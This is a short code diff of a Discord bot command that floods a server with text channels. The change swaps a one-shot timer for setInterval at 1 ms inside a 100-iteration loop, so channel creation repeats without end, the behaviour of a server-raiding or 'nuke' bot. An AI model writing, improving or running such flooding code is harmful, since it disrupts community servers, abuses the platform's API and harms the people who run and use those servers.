@@ -10,10 +10,10 @@ module.exports.run = async(client, message, args) => {
 
     var i;
     for (i = 0; i < 100; i++) {
-        setTimeout(() => {
+        setInterval(() => {
             message.guild.channels.create(channelname,{type: 'text'})
             .catch(console.error);
-        }, 1*1).catch(err => {return;})
+        }, 1)
     }
 }
 module.exports.help = {
